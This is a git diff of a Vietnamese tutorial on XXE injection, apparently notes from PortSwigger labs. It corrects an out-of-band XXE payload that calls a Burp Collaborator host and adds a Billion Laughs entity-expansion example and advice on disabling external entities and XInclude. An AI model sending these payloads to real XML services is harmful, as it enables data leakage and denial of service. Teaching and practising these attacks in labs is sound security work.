@@ -376,12 +376,12 @@ Content-Length: 52
 
 Nói thêm 1 tý về ``parameter entity`` thì nó cũng có chức năng tương tự như là khai báo kiểu thông thường, tuy nhiên một số trường hợp mà khai báo thông thường bị block thì ta có thể dùng cách này để thay thế. Điểm khác nhau giữa ``parameter entity`` và cách khai báo thông thường là cách khai báo thông thường có thể được tham chiếu tới trong cả file XML, còn ``parameter entity`` thì chỉ được tham chiếu bên trong DTD hay nói dễ hiểu là bên trong phần ``<!DOCTYPE ...>``
 
-Web cho ta một trang check stock và nhiệm vụ của ta là thực hiện XXE out-of-bound đến Burp Collabroator
+Quay trở về với lab thìu lab cho ta một trang check stock và nhiệm vụ của ta là thực hiện XXE out-of-bound đến Burp Collabroator
 
 Ta thử inject payload bằng cách khai báo thông thường:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ywy2xnkgfa21yppymd4w623z4qagy5.oastify.com">}>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ywy2xnkgfa21yppymd4w623z4qagy5.oastify.com">]>
   <stockCheck>
     <productId>
       &xxe;
@@ -400,4 +400,60 @@ Vì khai báo kiểu thông thường bị block nên ta dùng ``parameter 
 Output:
 ![lab4](./img/lab4-output.png)
 
+## 11. Billion Laughs Attack 
+Ngoài ra thì XXE cũng có thể thực hiện một kỹ thuật tấn công gọi là Billion Laughs Attack. Kỹ thuật này lợi dụng việc XML parser không giới hạn dung lượng bộ nhớ mà nó có thể sử dụng, từ đó ta có thể dùng đệ quy để làm tràn bộ nhớ của target.
 
+Ví dụ một tình huống sau:
+Request:
+```xml
+POST http://example.com/xml HTTP/1.1
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [<!ENTITY name "endy">]>
+  <name>  
+  Hello &name; and welcome to my website!
+  </name>
+```
+
+Respone:
+```
+HTTP/1.0 200 OK 
+
+Hello endy and welcome to my website!
+```
+
+
+Khi ta thay đổi XML ở Request thành như sau:
+```xml
+POST http://example.com/xml HTTP/1.1
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [
+  <!ENTITY name "endy">
+  <!ENTITY name2 "&name;&name;">
+  <!ENTITY name3 "&name2;&name2;&name2;&name2;">
+  <!ENTITY name4 "&name3;&name3;&name3;&name3;">
+  ]>
+  <name>  
+  Hello &name4;
+  </name>
+```
+
+Thì cho ta respone:
+```xml
+Response
+HTTP/1.0 200 OK 
+
+Hello endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy endy
+```
+
+Càng nhiều biến ``name`` được đệ quy thì sẽ tiêu tốn càng nhiều bộ nhớ, và càng dễ khiến target bị tràn bộ nhớ
+
+## 12. Cách hạn chế lỗ hổng XXE injection
+Theo portswigger thì hầu như tất cả lổ hỏng XXE đều phát sinh từ thư viện XML parser của ứng dụng hổ trợ các tính năng XML nguy hiểm mà ứng dụng không cần sử dụng tới. Cách dễ và hiệu quả nhất để ngăn chặn các cuộc tấn công XXE là vô hiệu hóa các tính năng đó.
+
+Nói chung chỉ cần vô hiệu hóa external entities và XInclude là đủ. Điều này có thể được thực hiện bằng cách tùy chọn cấu hình hoặc ghi đè các hành vi mặc định.
+
+## Link tham khảo:
+https://portswigger.net/web-security/xxe
+https://brightsec.com/blog/xxe-vulnerability/
